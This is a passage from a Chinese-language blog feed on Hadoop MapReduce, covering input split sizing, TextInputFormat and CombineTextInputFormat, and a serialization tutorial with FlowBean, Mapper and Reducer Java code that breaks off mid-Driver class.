运算后，形成的切片信息如下：</p><ul><li>file1.txt.split1– 0~128</li><li>file1.txt.split2– 128~256</li><li>file1.txt.split3– 256~320</li><li>file2.txt.split1– 0~10M</li></ul><h2 id="4-3-FileInputFormat切片大小的参数配置"><a href="#4-3-FileInputFormat切片大小的参数配置" class="headerlink" title="4.3 FileInputFormat切片大小的参数配置"></a>4.3 FileInputFormat切片大小的参数配置</h2><h3 id="（1）源码中计算切片大小的公式"><a href="#（1）源码中计算切片大小的公式" class="headerlink" title="（1）源码中计算切片大小的公式"></a>（1）源码中计算切片大小的公式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Math.max(minSize, Math.min(maxSize, blockSize));</span><br><span class="line">mapreduce.input.fileinputformat.split.minsize=<span class="number">1</span> 默认值为<span class="number">1</span></span><br><span class="line">mapreduce.input.fileinputformat.split.maxsize= Long.MAXValue 默认值Long.MAXValue</span><br><span class="line">因此，默认情况下，切片大小=blocksize。</span><br></pre></td></tr></table></figure><h3 id="（2）切片大小设置"><a href="#（2）切片大小设置" class="headerlink" title="（2）切片大小设置"></a>（2）切片大小设置</h3><ul><li>maxsize（切片最大值）：参数如果调得比blockSize小，则会让切片变小，而且就等于配置的这个参数的值。 </li><li>minsize（切片最小值）：参数调的比blockSize大，则可以让切片变得比blockSize还大。</li></ul><h3 id="（3）获取切片信息API"><a href="#（3）获取切片信息API" class="headerlink" title="（3）获取切片信息API"></a>（3）获取切片信息API</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取切片的文件名称</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> inputSplit.getPath().getName();</span><br><span class="line"><span class="comment">// 根据文件类型获取切片信息</span></span><br><span class="line"><span class="type">FileSplit</span> <span class="variable">inputSplit</span> <span class="operator">=</span> (FileSplit) context.getInputSplit();</span><br></pre></td></tr></table></figure><h1 id="五：TextInputFormat"><a href="#五：TextInputFormat" class="headerlink" title="五：TextInputFormat"></a>五：TextInputFormat</h1><h2 id="5-1-FileInputFormat-实现类"><a href="#5-1-FileInputFormat-实现类" class="headerlink" title="5.1 FileInputFormat 实现类"></a>5.1 FileInputFormat 实现类</h2><ul><li>思考：在运行 MapReduce 程序时，输入的文件格式包括：基于行的日志文件、二进制 格式文件、数据库表等。那么，针对不同的数据类型，MapReduce 是如何读取这些数据的呢？</li><li>FileInputFormat 常见的接口实现类包括：TextInputFormat、KeyValueTextInputFormat、 NLineInputFormat、CombineTextInputFormat 和自定义 InputFormat 等。</li></ul><h2 id="5-2-TextInputFormat"><a href="#5-2-TextInputFormat" class="headerlink" title="5.2 TextInputFormat"></a>5.2 TextInputFormat</h2><ul><li><p>TextInputFormat 是默认的 FileInputFormat 实现类。按行读取每条记录。键是存储该行在整个文件中的起始字节偏移量， LongWritable 类型。值是这行的内容，不包括任何行终止 符（换行符和回车符），Text 类型。</p></li><li><p>以下是一个示例，比如，一个分片包含了如下 4 条文本记录。</p></li><li><p>&#96;&#96;&#96;java<br>Rich learning form<br>Intelligent learning engine<br>Learning more convenient<br>From the real demand for more close to the enterprise</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 每条记录表示为以下键/值对：</span><br><span class="line"></span><br><span class="line">- ```java</span><br><span class="line">  (0,Rich learning form)</span><br><span class="line">  (20,Intelligent learning engine)</span><br><span class="line">  (49,Learning more convenient)</span><br><span class="line">  (74,From the real demand for more close to the enterprise)</span><br></pre></td></tr></table></figure></li></ul><h1 id="六：CombineTextInputFormat-切片机制"><a href="#六：CombineTextInputFormat-切片机制" class="headerlink" title="六：CombineTextInputFormat 切片机制"></a>六：CombineTextInputFormat 切片机制</h1><p>框架默认的 TextInputFormat 切片机制是对任务按文件规划切片，不管文件多小，都会 是一个单独的切片，都会交给一个 MapTask，这样如果有大量小文件，就会产生大量的 MapTask，处理效率极其低下。</p><h2 id="6-1-应用场景"><a href="#6-1-应用场景" class="headerlink" title="6.1 应用场景"></a>6.1 应用场景</h2><p>CombineTextInputFormat 用于小文件过多的场景，它可以将多个小文件从逻辑上规划到 一个切片中，这样，多个小文件就可以交给一个 MapTask 处理。</p><h2 id="6-2-虚拟存储切片最大值设置"><a href="#6-2-虚拟存储切片最大值设置" class="headerlink" title="6.2 虚拟存储切片最大值设置"></a>6.2 虚拟存储切片最大值设置</h2><ul><li>CombineTextInputFormat.setMaxInputSplitSize(job, 4194304);&#x2F;&#x2F; 4m </li><li>注意：虚拟存储切片最大值设置最好根据实际的小文件大小情况来设置具体的值。</li></ul><h2 id="6-3-切片机制"><a href="#6-3-切片机制" class="headerlink" title="6.3 切片机制"></a>6.3 切片机制</h2><p>生成切片过程包括：虚拟存储过程和切片过程二部分。</p><p>CombineTextInputFormat切片机制：</p><p><img src="/blog/f5d61b06.html/image-20221218143247678.png"></p><h3 id="（1）虚拟存储过程"><a href="#（1）虚拟存储过程" class="headerlink" title="（1）虚拟存储过程"></a>（1）虚拟存储过程</h3><ul><li>将输入目录下所有文件大小，依次和设置的 setMaxInputSplitSize 值比较，如果不大于设置的最大值，逻辑上划分一个块。</li><li>如果输入文件大于设置的最大值且大于两倍， 那么以最大值切割一块；当剩余数据大小超过设置的最大值且不大于最大值 2 倍，此时 将文件均分成 2 个虚拟存储块（防止出现太小切片）。 <ul><li>例如 setMaxInputSplitSize 值为 4M，输入文件大小为 8.02M，则先逻辑上分成一个 4M。剩余的大小为 4.02M，如果按照 4M 逻辑划分，就会出现 0.02M 的小的虚拟存储 文件，所以将剩余的 4.02M 文件切分成（2.01M 和 2.01M）两个文件。</li></ul></li></ul><h3 id="（2）切片过程"><a href="#（2）切片过程" class="headerlink" title="（2）切片过程"></a>（2）切片过程</h3><ul><li>判断虚拟存储的文件大小是否大于 setMaxInputSplitSize 值，大于等于则单独 形成一个切片。</li><li>如果不大于则跟下一个虚拟存储文件进行合并，共同形成一个切片。</li><li>测试举例<ul><li>有 4 个小文件大小分别为 1.7M、5.1M、3.4M 以及 6.8M 这四个小 文件，则虚拟存储之后形成 6 个文件块，大小分别为：<ul><li>1.7M，（2.55M、2.55M）、3.4M 以及（3.4M、3.4M）</li></ul></li><li>最终会形成 3 个切片，大小分别为：<ul><li>（1.7+2.55）M，（2.55+3.4）M，（3.4+3.4）M</li></ul></li></ul></li></ul><h1 id="七：CombineTextInputFormat-案例实操"><a href="#七：CombineTextInputFormat-案例实操" class="headerlink" title="七：CombineTextInputFormat 案例实操"></a>七：CombineTextInputFormat 案例实操</h1><h2 id="7-1-需求"><a href="#7-1-需求" class="headerlink" title="7.1 需求"></a>7.1 需求</h2><p>将输入的大量小文件合并成一个切片统一处理。</p><h3 id="（1）输入数据"><a href="#（1）输入数据" class="headerlink" title="（1）输入数据"></a>（1）输入数据</h3><ul><li>准备 4 个小文件</li></ul><h3 id="（2）期望"><a href="#（2）期望" class="headerlink" title="（2）期望"></a>（2）期望</h3><ul><li>期望一个切片处理 4 个文件</li></ul><h2 id="7-2-需求分析"><a href="#7-2-需求分析" class="headerlink" title="7.2 需求分析"></a>7.2 需求分析</h2><p>通过设置切片方式为 CombineTextInputFormat，并设置切片大小，将多个小文件进行合并，然后处理。</p><h2 id="7-3-代码实现"><a href="#7-3-代码实现" class="headerlink" title="7.3 代码实现"></a>7.3 代码实现</h2><p>（1）不做任何处理，采用默认的 FileInputFormat切片方式，观察切片个数为 4。</p><ul><li>通过日志观察到：number of splits:4</li></ul><p>（2）设置切片方式为 CombineTextInputFormat </p><ul><li><p>在驱动器中添加如下代码</p></li><li><pre><code class="java">// 如果不设置 InputFormat，它默认用的是 TextInputFormat.classjob.setInputFormatClass(CombineTextInputFormat.class);//虚拟存储切片最大值设置 4mCombineTextInputFormat.setMaxInputSplitSize(job, 4194304);</code></pre></li><li><p>此时观察日志：number of splits:1</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hadoop 序列化</title>
      <link href="/blog/926ade3a.html/"/>
      <url>/blog/926ade3a.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：序列化概述"><a href="#一：序列化概述" class="headerlink" title="一：序列化概述"></a>一：序列化概述</h1><h2 id="1-1-什么是序列化？"><a href="#1-1-什么是序列化？" class="headerlink" title="1.1 什么是序列化？"></a>1.1 什么是序列化？</h2><ul><li>序列化就是把内存中的对象，转换成字节序列（或其他数据传输协议）以便于存储到磁 盘（持久化）和网络传输。</li><li>反序列化就是将收到字节序列（或其他数据传输协议）或者是磁盘的持久化数据，转换 成内存中的对象。</li></ul><h2 id="1-2-为什么要序列化？"><a href="#1-2-为什么要序列化？" class="headerlink" title="1.2 为什么要序列化？"></a>1.2 为什么要序列化？</h2><p>一般来说，“活的”对象只生存在内存里，关机断电就没有了。而且“活的”对象只能 由本地的进程使用，不能被发送到网络上的另外一台计算机。 然而序列化可以存储“活的” 对象，可以将“活的”对象发送到远程计算机。</p><h2 id="1-3-为什么不用-Java-的序列化？"><a href="#1-3-为什么不用-Java-的序列化？" class="headerlink" title="1.3 为什么不用 Java 的序列化？"></a>1.3 为什么不用 Java 的序列化？</h2><p>Java 的序列化是一个重量级序列化框架（Serializable），一个对象被序列化后，会附带 很多额外的信息（各种校验信息，Header，继承体系等），不便于在网络中高效传输。所以， Hadoop 自己开发了一套序列化机制（Writable）。</p><h2 id="1-4-Hadoop-序列化特点"><a href="#1-4-Hadoop-序列化特点" class="headerlink" title="1.4 Hadoop 序列化特点"></a>1.4 Hadoop 序列化特点</h2><p>（1）紧凑 ：高效使用存储空间。</p><p>（2）快速：读写数据的额外开销小。</p><p>（3）互操作：支持多语言的交互。</p><h1 id="二：自定义-bean-对象实现序列化接口（Writable）"><a href="#二：自定义-bean-对象实现序列化接口（Writable）" class="headerlink" title="二：自定义 bean 对象实现序列化接口（Writable）"></a>二：自定义 bean 对象实现序列化接口（Writable）</h1><p>在企业开发中往往常用的基本序列化类型不能满足所有需求，比如在 Hadoop 框架内部 传递一个 bean 对象，那么该对象就需要实现序列化接口。</p><p>具体实现 bean 对象序列化步骤如下 7 步：</p><h2 id="2-1-必须实现-Writable-接口"><a href="#2-1-必须实现-Writable-接口" class="headerlink" title="2.1 必须实现 Writable 接口"></a>2.1 必须实现 Writable 接口</h2><h2 id="2-2-反序列化时，需要反射调用空参构造函数，所以必须有空参构造"><a href="#2-2-反序列化时，需要反射调用空参构造函数，所以必须有空参构造" class="headerlink" title="2.2 反序列化时，需要反射调用空参构造函数，所以必须有空参构造"></a>2.2 反序列化时，需要反射调用空参构造函数，所以必须有空参构造</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">FlowBean</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">super</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-3-重写序列化方法"><a href="#2-3-重写序列化方法" class="headerlink" title="2.3 重写序列化方法"></a>2.3 重写序列化方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(DataOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">out.writeLong(upFlow);</span><br><span class="line">out.writeLong(downFlow);</span><br><span class="line">out.writeLong(sumFlow);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-4-重写反序列化方法"><a href="#2-4-重写反序列化方法" class="headerlink" title="2.4 重写反序列化方法"></a>2.4 重写反序列化方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readFields</span><span class="params">(DataInput in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">upFlow = in.readLong();</span><br><span class="line">downFlow = in.readLong();</span><br><span class="line">sumFlow = in.readLong();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-注意反序列化的顺序和序列化的顺序完全一致"><a href="#2-5-注意反序列化的顺序和序列化的顺序完全一致" class="headerlink" title="2.5 注意反序列化的顺序和序列化的顺序完全一致"></a>2.5 注意反序列化的顺序和序列化的顺序完全一致</h2><h2 id="2-6-要想把结果显示在文件中，需要重写-toString-，可用”-t”分开，方便后续用。"><a href="#2-6-要想把结果显示在文件中，需要重写-toString-，可用”-t”分开，方便后续用。" class="headerlink" title="2.6 要想把结果显示在文件中，需要重写 toString()，可用”\t”分开，方便后续用。"></a>2.6 要想把结果显示在文件中，需要重写 toString()，可用”\t”分开，方便后续用。</h2><h2 id="2-7-如果需要将自定义的-bean-放在-key-中传输，则还需要实现-Comparable-接口，因为-MapReduce-框中的-Shuffle-过程要求对-key-必须能排序。"><a href="#2-7-如果需要将自定义的-bean-放在-key-中传输，则还需要实现-Comparable-接口，因为-MapReduce-框中的-Shuffle-过程要求对-key-必须能排序。" class="headerlink" title="2.7 如果需要将自定义的 bean 放在 key 中传输，则还需要实现 Comparable 接口，因为 MapReduce 框中的 Shuffle 过程要求对 key 必须能排序。"></a>2.7 如果需要将自定义的 bean 放在 key 中传输，则还需要实现 Comparable 接口，因为 MapReduce 框中的 Shuffle 过程要求对 key 必须能排序。</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(FlowBean o)</span> &#123;</span><br><span class="line"><span class="comment">// 倒序排列，从大到小</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.sumFlow &gt; o.getSumFlow() ? -<span class="number">1</span> : <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="三：序列化案例实操"><a href="#三：序列化案例实操" class="headerlink" title="三：序列化案例实操"></a>三：序列化案例实操</h1><h2 id="3-1-需求"><a href="#3-1-需求" class="headerlink" title="3.1 需求"></a>3.1 需求</h2><p>统计每一个手机号耗费的总上行流量、总下行流量、总流量</p><h3 id="（1）输入数据"><a href="#（1）输入数据" class="headerlink" title="（1）输入数据"></a>（1）输入数据</h3><p>phone_data.txt</p><h3 id="（2）输入数据格式"><a href="#（2）输入数据格式" class="headerlink" title="（2）输入数据格式"></a>（2）输入数据格式</h3><p><img src="/blog/926ade3a.html/image-20221217213353463.png"></p><h3 id="（3）期望输出数据格式"><a href="#（3）期望输出数据格式" class="headerlink" title="（3）期望输出数据格式"></a>（3）期望输出数据格式</h3><p><img src="/blog/926ade3a.html/image-20221217213418569.png"></p><h2 id="3-2-需求分析"><a href="#3-2-需求分析" class="headerlink" title="3.2 需求分析"></a>3.2 需求分析</h2><p><img src="/blog/926ade3a.html/image-20221217213615452.png"></p><h2 id="3-3-编写-MapReduce-程序"><a href="#3-3-编写-MapReduce-程序" class="headerlink" title="3.3 编写 MapReduce 程序"></a>3.3 编写 MapReduce 程序</h2><h3 id="（1）编写流量统计的-Bean-对象"><a href="#（1）编写流量统计的-Bean-对象" class="headerlink" title="（1）编写流量统计的 Bean 对象"></a>（1）编写流量统计的 Bean 对象</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.writable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Writable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.DataInput;</span><br><span class="line"><span class="keyword">import</span> java.io.DataOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 21:40 2022/12/17</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlowBean</span> <span class="keyword">implements</span> <span class="title class_">Writable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> upFlow;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> downFlow;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> sumFlow;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FlowBean</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSumFlow</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sumFlow = <span class="built_in">this</span>.upFlow + <span class="built_in">this</span>.downFlow;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(DataOutput dataOutput)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        dataOutput.writeLong(upFlow);</span><br><span class="line">        dataOutput.writeLong(downFlow);</span><br><span class="line">        dataOutput.writeLong(sumFlow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readFields</span><span class="params">(DataInput dataInput)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.upFlow = dataInput.readLong();</span><br><span class="line">        <span class="built_in">this</span>.downFlow = dataInput.readLong();</span><br><span class="line">        <span class="built_in">this</span>.sumFlow = dataInput.readLong();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> upFlow + <span class="string">&quot;\t&quot;</span> + downFlow + <span class="string">&quot;\t&quot;</span> + sumFlow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（2）编写-Mapper-类"><a href="#（2）编写-Mapper-类" class="headerlink" title="（2）编写 Mapper 类"></a>（2）编写 Mapper 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.writable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.LongWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 21:59 2022/12/17</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlowMapper</span> <span class="keyword">extends</span> <span class="title class_">Mapper</span>&lt;LongWritable, Text, Text, FlowBean&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Text</span> <span class="variable">outK</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Text</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">FlowBean</span> <span class="variable">outV</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FlowBean</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">map</span><span class="params">(LongWritable key, Text value, Mapper&lt;LongWritable, Text, Text, FlowBean&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.获取一行数据</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> value.toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.切割数据</span></span><br><span class="line">        <span class="keyword">final</span> String[] split = line.split(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.抓取手机号、上行流量、下行流量</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">phone</span> <span class="operator">=</span> split[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">upFlow</span> <span class="operator">=</span> split[split.length - <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">downFlow</span> <span class="operator">=</span> split[split.length - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.封装 outK outV</span></span><br><span class="line">        outK.set(phone);</span><br><span class="line">        outV.setUpFlow(Long.parseLong(upFlow));</span><br><span class="line">        outV.setDownFlow(Long.parseLong(downFlow));</span><br><span class="line">        outV.setSumFlow();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.写出 outK outV</span></span><br><span class="line">        context.write(outK, outV);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（3）编写-Reducer-类"><a href="#（3）编写-Reducer-类" class="headerlink" title="（3）编写 Reducer 类"></a>（3）编写 Reducer 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.writable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 22:07 2022/12/17</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlowReducer</span> <span class="keyword">extends</span> <span class="title class_">Reducer</span>&lt;Text, FlowBean, Text, FlowBean&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">FlowBean</span> <span class="variable">outV</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FlowBean</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">reduce</span><span class="params">(Text key, Iterable&lt;FlowBean&gt; values, Reducer&lt;Text, FlowBean, Text, FlowBean&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">totalUpFlow</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">totalDownFlow</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.遍历values,将其中的上行流量和下行流量分别累计</span></span><br><span class="line">        <span class="keyword">for</span> (FlowBean value : values) &#123;</span><br><span class="line">            totalUpFlow += value.getUpFlow();</span><br><span class="line">            totalDownFlow += value.getDownFlow();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.封装 outKV</span></span><br><span class="line">        outV.setUpFlow(totalUpFlow);</span><br><span class="line">        outV.setDownFlow(totalDownFlow);</span><br><span class="line">        outV.setSumFlow();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.写出 outK outV</span></span><br><span class="line">        context.write(key, outV);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（4）编写-Driver-驱动类"><a href="#（4）编写-Driver-驱动类" class="headerlink" title="（4）编写 Driver 驱动类"></a>（4）编写 Driver 驱动类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.writable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span 